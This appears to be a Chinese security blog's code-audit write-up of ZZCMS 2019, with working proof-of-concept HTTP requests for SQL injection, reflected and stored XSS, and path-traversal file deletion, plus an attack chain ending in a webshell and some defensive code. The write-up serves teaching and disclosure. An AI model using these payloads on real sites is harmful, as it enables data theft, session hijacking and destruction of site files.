#  【PHP代码审计】ZZCMS 2019多个漏洞（附POC）   
原创 WL  Rot5pider安全团队   2025-04-23 00:41  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/OMTnCvx3T1K26bQox3P7WP9dbZ8fiaWVicSJVHHWO60crnKGLXjx1WNlyy6IK4DuoWp6Q4oRVqhic4aKakMh6VHQQ/640?wx_fmt=png&from=appmsg "")  
  
  
引  
  
言  
  
     
zzcms,站长招商网cms,适用于招商代理型的行业网站,可用于医药招商网站程序源码,服装招商网站程序源码,化妆品招商网站的程序源码等。 为啥审这个CMS，洞多（类型也多） 官网最新版下载地址：http://www.zzcms.net              
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/OMTnCvx3T1KXhnqibBY5ZTmZr6uOnaAibFEhc9vNYYDc6lEic5QDicW3Bvbx5IREtpN6sMRRrSgicCq7sEhuBUibuibOw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/OMTnCvx3T1KXhnqibBY5ZTmZr6uOnaAibFu8fWOvicFURXVKm3sSpKjpQy4RyYLZMMqUuLAfquT1UrolsSN0rcnwA/640?wx_fmt=png&from=appmsg "")  
#   
## 一、项目概况  
  
**系统名称**  
：ZZCMS 2019（站长招商网CMS）**适用场景**  
：医药/服装/化妆品等行业招商网站**官网地址**  
：www.zzcms.net**审计版本**  
：v2019.12（最新公开版）**漏洞特点**  
：存在多处高危漏洞，适合渗透测试教学场景  
## 二、漏洞详情  
### （一）SQL注入漏洞  
#### 1. 前台SQL注入（高危）  
  
**位置**  
：/admin/help_manage.php  
 第61行**参数**  
：keyword  
（未过滤）**触发条件**  
：  
- 管理员权限访问  
  
- checkid()  
函数仅验证$b  
参数为数字（低版本无此限制）  
前期通过工具，发现 /admin/help_manage.php 存在SQL注入漏洞 代码位置：/admin/help_manage.php 61行，keyword参数存在SQL注入，小伙伴们可能会问上面的 $b 变量也是直接拼接进SQL语句（下面会讲）![](https://mmbiz.qpic.cn/sz_mmbiz_png/OMTnCvx3T1KXhnqibBY5ZTmZr6uOnaAibFKibZGE9eVY1iboa7K6G2ytb0KhafDTlX8hxoV4ba0kET6icT63Aw1AicbQ/640?wx_fmt=png&from=appmsg "")  
  
  
往上追溯参数出处，这里$keyword  
无限制，$b传入checkid()  
函数导致无法进行注入  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/OMTnCvx3T1KXhnqibBY5ZTmZr6uOnaAibF1zWF033tuzGKkgbZBmw51RAmNRH9Ad3SG4fIJG3fd1BPo1XBiaq8ibFw/640?wx_fmt=png&from=appmsg "")  
跟进 checkid() 函数，判断 $b 参数是否为数字  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/OMTnCvx3T1KXhnqibBY5ZTmZr6uOnaAibFJNTSejB8Nicbv8CnQYxVlJJw3ibS1SpuKOICDfSDaEXvAMu3Tnia3mlnw/640?wx_fmt=png&from=appmsg "")  
这个 checkid($b,1)  
 是高版本加上去了，看了下网上的低版本，未对   
做限制（低版本  
b也存在SQL注入）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/OMTnCvx3T1KXhnqibBY5ZTmZr6uOnaAibFNrLeAoPT1qZ2fhH75mB6TiacchlOgUwIfmhZ3bIcY3ZOz4g6sbHCL0Q/640?wx_fmt=png&from=appmsg "")  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/OMTnCvx3T1KXhnqibBY5ZTmZr6uOnaAibFZLlfjcia9NUnr2MRickshJ1EuIoLicjHZTGSlfXuTQyias5FpU8hSibfKCA/640?wx_fmt=png&from=appmsg "")  
  
**攻击载荷**  
：  
```
GET /zzcms/admin/help_manage.php?b=1&keyword=1'%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,user()%23 HTTP/1.1

```  
```
GET /zzcms/admin/help_manage.php?b=1&keyword=1'+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,NULL,NULL,user()--+- HTTP/1.1
Host: 127.0.0.1:81
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Connection: keep-alive

```  
  
**危害**  
：可提取管理员账号、数据库结构等敏感信息  
#### 2. 后台SQL注入（高危）  
  
**位置**  
：/admin/ad_manage.php  
 第56行**参数**  
：b  
（三重时间盲注）**技术细节**  
：  
```
// 漏洞代码片段
$b = $_POST['b'];
$sql = "SELECT * FROM ads WHERE id=$b LIMIT 1";

```  
  
代码位置：/admin/ad_manage.php 56行，$b 参数存在SQL注入  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/OMTnCvx3T1KXhnqibBY5ZTmZr6uOnaAibFHY7s2B8etbzkibMH7z4QuS4T6BpCpHtKo3ARNUUpp6dDPFMNmbcyQ4Q/640?wx_fmt=png&from=appmsg "")  
往上追溯   
参数出处，这里  
b 无限制  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/OMTnCvx3T1KXhnqibBY5ZTmZr6uOnaAibFH9LKXhTcjlrpKotYFDNzzhvia5LA6YvfSFt0cvVQ0hXUny8AicoHhOlA/640?wx_fmt=png&from=appmsg "")  
```
POST /zzcms/admin/ad_manage.php HTTP/1.1
Host: 127.0.0.1:81
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Cookie: BJYADMIN=um94irfvsah6bu5ak430sd52e3; tablename=zzcms_tagzs; __51cke__=; __51uvsct__undefined=1; __51vcke__undefined=2eceb1e3-f9f3-5730-bbc8-eb6463ad77c2; __51vuft__undefined=1745240446725; __tins__713776=%7B%22sid%22%3A%201745240445656%2C%20%22vd%22%3A%203%2C%20%22expires%22%3A%201745243111066%7D; __51laig__=5; __vtins__undefined=%7B%22sid%22%3A%20%224197ba29-fb41-5c53-be71-5096ea54da82%22%2C%20%22vd%22%3A%203%2C%20%22stt%22%3A%20865661%2C%20%22dr%22%3A%20852234%2C%20%22expires%22%3A%201745243112384%2C%20%22ct%22%3A%201745241312384%7D; admin=admin; pass=e10adc3949ba59abbe56e057f20f883e
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 67

b=1' AND (SELECT 8334 FROM (SELECT(SLEEP(2)))EDuJ) AND 'tWHb'='tWHb

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/OMTnCvx3T1KXhnqibBY5ZTmZr6uOnaAibFSLxBSrdyy7Wz3PZ9JBbpdhG0tn0PB0mrbmqIkc9kNHyTq3EVNv2IMg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/OMTnCvx3T1KXhnqibBY5ZTmZr6uOnaAibFH6yQMEFibd5f6lynxbvFXMOJNCWic6IzMVGlvuicvkCXasAAgvmMt4HXg/640?wx_fmt=png&from=appmsg "")  
  
**攻击载荷**  
：  
```
POST /zzcms/admin/ad_manage.php HTTP/1.1
Content-Length: 67
b=1' AND (SELECT 8334 FROM (SELECT(SLEEP(2)))EDuJ) AND 'tWHb'='tWHb

```  
  
**防御建议**  
：  
```
// 参数化查询示例
$stmt = $pdo->prepare("SELECT * FROM ads WHERE id=?");
$stmt->execute([$b]);

```  
### （二）XSS漏洞  
#### 1. 反射型XSS（中危）  
  
**位置**  
：/admin/help_manage.php  
 第31行**触发点**  
：直接输出keyword  
参数  
这套系统XSS很多，找一个构造下 代码位置：/admin/help_manage.php 31行，直接将接收的参数写入前端页面![](https://mmbiz.qpic.cn/sz_mmbiz_png/OMTnCvx3T1KXhnqibBY5ZTmZr6uOnaAibF6UfVBRowLWHEwFTg0R6Jw3t3grcfAGfC8kQdTkKvIbibGenMQsvkNVw/640?wx_fmt=png&from=appmsg "")  
**攻击载荷**  
：  
```
/admin/help_manage.php?keyword="><script>alert(/xss/)</script>

```  
  
/admin/help_manage.php?keyword="><input%20onfocus="alert(/xss/)  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/OMTnCvx3T1KXhnqibBY5ZTmZr6uOnaAibFcib10Q1CKV4gzK9yqafhQiaFdEZ8nmvAX8s1qCI2OdF2IpiarUPtv5kPQ/640?wx_fmt=png&from=appmsg "")  
  
  
**危害**  
：可窃取管理员Cookie、劫持会话  
#### 2. 存储型XSS（高危）  
  
**位置**  
：/user/ask.php  
 第218行**漏洞点**  
：markt()  
函数未过滤用户输入**攻击链**  
：  
1. 发布包含恶意代码的咨询  
  
1. 管理员查看时触发XSS  
代码位置：/user/ask.php 218行，令id=1 即可进入if判断，漏洞点是markit() 函数导致的  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/OMTnCvx3T1KXhnqibBY5ZTmZr6uOnaAibFGAE3L7rIHUjJoVxAK28VPeepVLkUBqMgAE3Iyr72yQeiaicosmt56NdQ/640?wx_fmt=png&from=appmsg "")  
跟进markit() 函数，直接获取请求URL插入数据库  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/OMTnCvx3T1KXhnqibBY5ZTmZr6uOnaAibFX4OJ8uo79CZIDRriclPMwCuiaYPMGaYiavp0XzukRTZiblB3CXqwQxShCw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/OMTnCvx3T1KXhnqibBY5ZTmZr6uOnaAibF5QWua62ksjuib1868LznEJx92XIVElwSse8FbXNdicOG3ib3HguqzzEEQ/640?wx_fmt=png&from=appmsg "")  
  
**攻击载荷**  
：  
```
/user/ask.php?do=modify&id=1&test=<svg/src/1/onload=alert(/266/);>

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/OMTnCvx3T1KXhnqibBY5ZTmZr6uOnaAibFss4lrU2yU6n4T7VYXAWBZM8JmviakibZ1C2pT1VKfvliazauArFOKIxIg/640?wx_fmt=png&from=appmsg "")  
  
**防御方案**  
：  
```
// 输出过滤示例
echo htmlspecialchars($content, ENT_QUOTES, 'UTF-8');

```  
### （三）任意文件删除漏洞（高危）  
  
**位置**  
：/admin/uploadfile_nouse.php  
 第195行**参数**  
：mlname  
（路径遍历）  
代码位置：/admin/uploadfile_nouse.php 195行,ublink() 函数  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/OMTnCvx3T1KXhnqibBY5ZTmZr6uOnaAibFib8qAh0nMEBEv5N4zyLoJUbb6ly9VnIpdeUTk8XicPtric7HS1ic69Rt8A/640?wx_fmt=png&from=appmsg "")  
往上追溯   
变量，确定参数  
mlname 可控，路径可控  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/OMTnCvx3T1KXhnqibBY5ZTmZr6uOnaAibFF9SeLnSOJDcIXYrEWtgTSDLXGK1KtYRcjpYkoicD0M8LkdYic4wquib7A/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/OMTnCvx3T1KXhnqibBY5ZTmZr6uOnaAibFIuKYic2jFXkSdkhwFpgABdfySZwT7rReOAiaCb7wSvMibBEHbRhVgP7sw/640?wx_fmt=png&from=appmsg "")  
  
**攻击载荷**  
：  
```
GET /zzcms/admin/uploadfile_nouse.php?action=del&mlname=../../../../skin HTTP/1.1

```  
```
GET /zzcms/admin/uploadfile_nouse.php?action=del&mlname=../test11 HTTP/1.1
Host: 127.0.0.1:81
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Cookie: BJYADMIN=um94irfvsah6bu5ak430sd52e3; tablename=zzcms_tagzs; __51cke__=; __51uvsct__undefined=1; __51vcke__undefined=2eceb1e3-f9f3-5730-bbc8-eb6463ad77c2; __51vuft__undefined=1745240446725; __tins__713776=%7B%22sid%22%3A%201745240445656%2C%20%22vd%22%3A%203%2C%20%22expires%22%3A%201745243111066%7D; __51laig__=5; __vtins__undefined=%7B%22sid%22%3A%20%224197ba29-fb41-5c53-be71-5096ea54da82%22%2C%20%22vd%22%3A%203%2C%20%22stt%22%3A%20865661%2C%20%22dr%22%3A%20852234%2C%20%22expires%22%3A%201745243112384%2C%20%22ct%22%3A%201745241312384%7D; admin=admin; pass=e10adc3949ba59abbe56e057f20f883e
Connection: keep-alive

```  
  
执行前![](https://mmbiz.qpic.cn/sz_mmbiz_png/OMTnCvx3T1KXhnqibBY5ZTmZr6uOnaAibFHQTSBDAhia2gmFwvCSAXszQIk1taUqEyTxg8ujDSiaZWOnwszUsbiasmQ/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/OMTnCvx3T1KXhnqibBY5ZTmZr6uOnaAibFbic2WUes8YgePCBvq1wtSwAv25f41yHibAqZD9mqKL7wicnbMwnN9HQcQ/640?wx_fmt=png&from=appmsg "")  
执行后，test666 目录直接被删除  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/OMTnCvx3T1KXhnqibBY5ZTmZr6uOnaAibFGI1hjUrZo25bVIuC9x9YpS5OcicGGLQOlBk2Eaibvib8uibCy0SSxYia8jQ/640?wx_fmt=png&from=appmsg "")  
  
**危害**  
：可删除核心配置文件导致系统瘫痪  
## 三、漏洞利用链  
### （一）攻击场景还原  
1. **信息收集**  
：通过help_manage.php  
注入获取管理员账号  
  
1. **会话劫持**  
：利用存储型XSS窃取管理员Session  
  
1. **权限提升**  
：通过文件删除漏洞破坏系统文件  
  
1. **持久化控制**  
：植入WebShell  
  
### （二）防御体系重构  
#### 1. 输入验证强化  
```
// 白名单过滤示例
$allowed_params = ['id', 'name'];
foreach ($_REQUEST as $key => $value) {
    if (!in_array($key, $allowed_params)) {
        unset($_REQUEST[$key]);
    }
}

```  
#### 2. 输出编码规范  
```
// CSP头部配置
header("Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com;");

```  
#### 3. 文件操作加固  
```
// 安全删除函数
function safeDelete($path) {
    $realPath = realpath($path);
    if (strpos($realPath, __DIR__) !== 0) {
        die("Invalid path");
    }
    unlink($realPath);
}

```  
## 四、修复验证方法  
### （一）SQL注入修复验证  
```
# 使用sqlmap验证修复效果
sqlmap -u "http://target/help_manage.php?b=1&keyword=1" --batch --dbs

```  
### （二）XSS修复验证  
```
// Burp Intruder测试反射型XSS
payloads = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"]

```  
## 五、总结  
  
ZZCMS 2019存在典型的**信任边界模糊**  
问题：  
1. 前后台数据未隔离  
  
1. 文件操作缺乏权限控制  
  
1. 输入输出未严格过滤  
  
建议升级至最新版本（若可用），并部署WAF进行实时防护。本报告可作为同类CMS的安全基线评估参考。  
#   
  
  
  
  
【限时  
6  
折！华普安全研究星球：以  
原创实战  
为主+SRC/内网渗透核心资源库，助你在漏洞挖掘、SRC挖掘少走90%弯路】当90%的网络安全学习者还在重复刷题、泡论坛找零散资料时，华普安全研究星球已构建起完整的「攻防实战知识生态」：  
  
✅ 原创深度技术文档（独家SRC漏洞报告/代码审计报告）  
  
✅ 实战中使用到的工具分享  
  
✅ 全年更新SRC挖掘、代码审计报告（含最新0day验证思路）  
  
✅ 漏洞挖掘思维导图  
  
✅内部知识库目前建设中、后续进入圈子免费进入  
  
【  
实战为王  
】不同于传统课程的纸上谈兵！！  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/OMTnCvx3T1KibZGSTtYYMVNzA35ZxXVRT1s5WIQzLQXibdxCf6fkianYH5bSeKhcPcQPNR8E1iaJz2aAqonzogTKicg/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/OMTnCvx3T1KibZGSTtYYMVNzA35ZxXVRTxJibeicaQ0uttmutBuckibQFCEVicpyhhWXprQVOn4AnAnpDauQiaWTblMQ/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/OMTnCvx3T1KibZGSTtYYMVNzA35ZxXVRT9hvFFPpSupL0Q8d0Yv1F7dYxGZJjcKxHYTyiayhMI3xcVRoQhSs9VTQ/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/OMTnCvx3T1KibZGSTtYYMVNzA35ZxXVRTh0eO1DbG0onZph7o1AMPVU65ZjE5T9QH8XeMU0WNE5HiaUibNTBcQyyg/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/OMTnCvx3T1KibZGSTtYYMVNzA35ZxXVRTpXhxBicMHYsw8hotg4abR2gdaqYkfGPhX8EeNPcibAAs89qcOWl8Sqdw/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/OMTnCvx3T1KibZGSTtYYMVNzA35ZxXVRTJvsQnibaNk5WSuwpkDvkZTIFqN3XyKic4Mg5qI91sjNGQtibJRbEfIxgw/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/OMTnCvx3T1KibZGSTtYYMVNzA35ZxXVRT7UqeH8ibia1N77Q9iaLtwD9NU7Nt9gicr8sdmDGfQQvibnTDKQYNIJP6tFw/640?wx_fmt=jpeg&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
  
  
  
**后期我们将持续发布原创代码审计、src等漏洞挖掘文章，后期有些源码、挖掘思路等也会放进圈子哈~**  
  
**有任何问题可后台留言**  
  
  
  
  
往期精选  
  
  
  
围观  
  
[PHP代码审计学习](http://mp.weixin.qq.com/s?__biz=Mzg5OTYxMjk0Mw==&mid=2247484594&idx=1&sn=89c96ed25e1f1d146fa3e67026ae0ca1&chksm=c051ecd2f72665c45d3e8c51b94629319b992f7f459d5677d7ce253eac99fc5e2e8f78684907&scene=21#wechat_redirect)  
  
  
丨更多  
  
热文  
  
[浅谈应急响应](http://mp.weixin.qq.com/s?__biz=Mzg5OTYxMjk0Mw==&mid=2247484589&idx=1&sn=80ff6dbb4471c101a71e203a10354d59&chksm=c051eccdf72665db0530fce6a332bf44392fb0c4d3d61496c9141bb93ece816cbbe97f89d06f&scene=21#wechat_redirect)  
  
  
丨更多  
  
·end·  
  
—如果喜欢，快分享给你的朋友们吧—  
  
我们一起愉快的玩耍吧  
  
  
  
【免责声明】  
  
"Rot5pider安全团队"作为专注于信息安全技术研究的自媒体平台，致力于传播网络安全领域的前沿知识与防御技术。本平台所载文章、工具及案例均用于合法合规的技术研讨与安全防护演练，严禁任何形式的非法入侵、数据窃取等危害网络安全的行为。所有技术文档仅代表作者研究过程中的技术观察，不构成实际操作建议，更不作为任何法律行为的背书。  
  
  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/OMTnCvx3T1K26bQox3P7WP9dbZ8fiaWVicDTm83Sic86kzBCzlXI5OiazEoc5ZrPHHWsRb80WlZcKRll5xOU2s5JKw/640?wx_fmt=gif&from=appmsg "")  
  
  
  
